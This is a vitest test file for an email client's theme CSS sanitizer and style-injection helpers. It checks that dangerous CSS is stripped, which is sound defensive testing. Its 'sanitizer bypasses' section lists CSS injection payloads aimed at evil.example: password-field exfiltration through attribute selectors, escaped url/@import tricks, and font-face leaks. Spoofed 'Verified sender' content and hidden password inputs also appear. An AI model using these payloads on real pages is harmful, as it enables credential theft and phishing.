import { describe, it, expect, afterEach } from 'vitest';
import {
  sanitizeThemeCSS,
  sanitizeSkinCSS,
  validateThemeSelectors,
  injectThemeCSS,
  removeThemeCSS,
  injectThemeSkinCSS,
  removeThemeSkinCSS,
  validateThemeCSSSafety,
} from '../theme-loader';

describe('theme-loader', () => {
  describe('sanitizeThemeCSS', () => {
    it('passes through safe CSS unchanged', () => {
      const css = ':root { --color-primary: #3b82f6; }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).toBe(css);
      expect(warnings).toHaveLength(0);
    });

    it('strips @import directives', () => {
      const css = '@import url("evil.css");\n:root { --color-primary: red; }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('@import');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips external url() references', () => {
      const css = ':root { background: url("https://evil.com/track.png"); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('https://evil.com');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips javascript: in CSS', () => {
      const css = ':root { background: javascript:alert(1); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('javascript:');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips expression()', () => {
      const css = ':root { width: expression(document.body.clientWidth); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('expression(');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips -moz-binding', () => {
      const css = ':root { -moz-binding: url("evil.xml#xbl"); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('-moz-binding');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips behavior:', () => {
      const css = ':root { behavior: url(evil.htc); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('behavior');
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('strips multiple dangerous patterns at once', () => {
      const css = '@import url("a.css"); :root { -moz-binding: url("b.xml"); background: expression(1); }';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('@import');
      expect(cleaned).not.toContain('-moz-binding');
      expect(cleaned).not.toContain('expression(');
      expect(warnings.length).toBeGreaterThanOrEqual(3);
    });
  });

  describe('validateThemeSelectors', () => {
    it('accepts :root selector', () => {
      const warnings = validateThemeSelectors(':root { --color-primary: red; }');
      expect(warnings).toHaveLength(0);
    });

    it('accepts .dark selector', () => {
      const warnings = validateThemeSelectors('.dark { --color-primary: blue; }');
      expect(warnings).toHaveLength(0);
    });

    it('accepts @media queries', () => {
      const css = '@media (prefers-color-scheme: dark) { :root { --color-bg: #000; } }';
      const warnings = validateThemeSelectors(css);
      expect(warnings).toHaveLength(0);
    });

    it('accepts @font-face', () => {
      const css = '@font-face { font-family: "Test"; src: local("Test"); }';
      const warnings = validateThemeSelectors(css);
      expect(warnings).toHaveLength(0);
    });

    it('warns about body selector', () => {
      const css = 'body { background: red; }';
      const warnings = validateThemeSelectors(css);
      expect(warnings.length).toBeGreaterThan(0);
      expect(warnings[0]).toContain('body');
    });

    it('warns about element selectors', () => {
      const css = 'button { color: red; }';
      const warnings = validateThemeSelectors(css);
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('warns about class selectors other than .dark', () => {
      const css = '.my-class { color: red; }';
      const warnings = validateThemeSelectors(css);
      expect(warnings.length).toBeGreaterThan(0);
    });
  });

  describe('injectThemeCSS / removeThemeCSS', () => {
    afterEach(() => {
      removeThemeCSS();
    });

    it('injects a style element into head', () => {
      injectThemeCSS(':root { --color-primary: red; }');
      const styleEl = document.getElementById('active-theme');
      expect(styleEl).not.toBeNull();
      expect(styleEl?.tagName).toBe('STYLE');
      expect(styleEl?.textContent).toBe(':root { --color-primary: red; }');
    });

    it('updates existing style element on subsequent call', () => {
      injectThemeCSS(':root { --color-primary: red; }');
      injectThemeCSS(':root { --color-primary: blue; }');
      const styleEls = document.querySelectorAll('#active-theme');
      expect(styleEls).toHaveLength(1);
      expect(styleEls[0].textContent).toBe(':root { --color-primary: blue; }');
    });

    it('removeThemeCSS removes the style element', () => {
      injectThemeCSS(':root { --color-primary: red; }');
      removeThemeCSS();
      const styleEl = document.getElementById('active-theme');
      expect(styleEl).toBeNull();
    });

    it('removeThemeCSS is safe when no theme is injected', () => {
      expect(() => removeThemeCSS()).not.toThrow();
    });
  });

  describe('injectThemeSkinCSS / removeThemeSkinCSS', () => {
    afterEach(() => {
      removeThemeSkinCSS();
    });

    it('injects a separate <style> tag from the colour block', () => {
      injectThemeCSS(':root { --color-primary: red; }');
      injectThemeSkinCSS('button { padding: 4px; }', 'thunderbird');
      expect(document.getElementById('active-theme')).not.toBeNull();
      expect(document.getElementById('active-theme-skin')).not.toBeNull();
      expect(document.getElementById('active-theme-skin')?.textContent).toContain('button');
    });

    it('sets data-theme-skin on body to the active theme id', () => {
      injectThemeSkinCSS('button { padding: 4px; }', 'my-theme');
      expect(document.body.getAttribute('data-theme-skin')).toBe('my-theme');
    });

    it('removes the skin tag and body attribute on remove', () => {
      injectThemeSkinCSS('button { padding: 4px; }', 'my-theme');
      removeThemeSkinCSS();
      expect(document.getElementById('active-theme-skin')).toBeNull();
      expect(document.body.getAttribute('data-theme-skin')).toBeNull();
    });

    it('does not throw when removing without a prior inject', () => {
      expect(() => removeThemeSkinCSS()).not.toThrow();
    });
  });

  describe('sanitizeSkinCSS', () => {
    it('preserves component-level selectors', () => {
      const css = '[data-tour="email-list"] { font-size: 13px; } button { padding: 4px; }';
      const { css: cleaned, warnings } = sanitizeSkinCSS(css);
      expect(cleaned).toBe(css);
      expect(warnings).toHaveLength(0);
    });

    it('strips dangerous patterns', () => {
      const { css: cleaned, warnings } = sanitizeSkinCSS(
        '@import url("https://x.com/p.css"); button { background: javascript:alert(1); }',
      );
      expect(cleaned).not.toContain('@import');
      expect(cleaned).not.toContain('javascript:');
      expect(warnings.length).toBeGreaterThanOrEqual(2);
    });

    it('strips @charset and @namespace', () => {
      const { css: cleaned, warnings } = sanitizeSkinCSS(
        '@charset "utf-8"; @namespace url(http://www.w3.org/1999/xhtml); button { padding: 4px; }',
      );
      expect(cleaned).not.toContain('@charset');
      expect(cleaned).not.toContain('@namespace');
      expect(cleaned).toContain('button');
      expect(warnings.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('validateThemeCSSSafety', () => {
    it('accepts valid theme CSS', () => {
      const css = ':root { --color-primary: #3b82f6; --color-background: #fff; }';
      const { valid, errors } = validateThemeCSSSafety(css);
      expect(valid).toBe(true);
      expect(errors).toHaveLength(0);
    });

    it('rejects empty CSS', () => {
      const { valid, errors } = validateThemeCSSSafety('   ');
      expect(valid).toBe(false);
      expect(errors).toContain('Theme CSS is empty');
    });

    it('rejects CSS without color variables', () => {
      const css = ':root { font-size: 16px; }';
      const { valid, errors } = validateThemeCSSSafety(css);
      expect(valid).toBe(false);
      expect(errors.some(e => e.includes('--color-'))).toBe(true);
    });

    it('flags dangerous patterns', () => {
      const css = ':root { --color-primary: red; } @import url("evil.css");';
      const { valid, errors } = validateThemeCSSSafety(css);
      expect(valid).toBe(false);
      expect(errors.some(e => e.includes('disallowed'))).toBe(true);
    });
  });

  describe('sanitizer bypasses', () => {
    const BS = String.fromCharCode(92); // backslash
    const PAYLOADS: Record<string, string> = {
      protocolRelative: ':root{--color-primary:#123} input[type=password][value$="a"]{background-image:url(//evil.example/k?a)}',
      escapedScheme: ':root{--color-primary:#123} body{background:url(' + BS + '68ttps://evil.example/x)}',
      imageSet: ':root{--color-primary:#123} body{background-image:image-set("https://evil.example/x" 1x)}',
      escapedImport: '@' + BS + '69mport url(//evil.example/i.css); :root{--color-primary:#123}',
      escapedUrl: ':root{--color-primary:#123; --x: ' + BS + '75rl(//evil.example/y)}',
      fontFace: ':root{--color-primary:#123} @font-face{font-family:x;src:url(//evil.example/f?A);unicode-range:U+41} body{font-family:x}',
    };

    it.each(Object.entries(PAYLOADS))('%s: nothing reaches evil.example', (_name, css) => {
      const { css: cleaned } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('evil.example');
      expect(sanitizeSkinCSS(css).css).not.toContain('evil.example');
      expect(validateThemeCSSSafety(css).valid).toBe(false);
    });

    it('drops rules for any selector but :root and .dark', () => {
      const css = ':root{--color-primary:#123} [data-testid=sender]::after{content:"Verified sender"} .dark{--color-primary:#456}';
      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
      expect(cleaned).not.toContain('Verified sender');
      expect(cleaned).toContain('--color-primary:#123');
      expect(cleaned).toContain('--color-primary:#456');
      expect(warnings.some((w) => w.includes('[data-testid=sender]'))).toBe(true);
    });

    it('drops rules nested inside :root', () => {
      const { css: cleaned } = sanitizeThemeCSS(':root{--color-primary:#123; & input[type=password]{display:none}}');
      expect(cleaned).not.toContain('password');
    });

    it('keeps @media, @supports and @keyframes wrappers around allowed rules', () => {
      const css = '@media (prefers-contrast: more){:root{--color-border:#000} body{display:none}} @keyframes pulse{from{opacity:0}to{opacity:1}}';
      const { css: cleaned } = sanitizeThemeCSS(css);
      expect(cleaned).toContain('@media (prefers-contrast: more)');
      expect(cleaned).toContain('--color-border:#000');
      expect(cleaned).not.toContain('display:none');
      expect(cleaned).toContain('@keyframes pulse');
    });

    it('keeps a same-document fragment reference', () => {
      const css = ':root{--color-primary:#123; --mask: url(#fade)}';
      expect(sanitizeThemeCSS(css).css).toContain('url(#fade)');
    });
  });
});
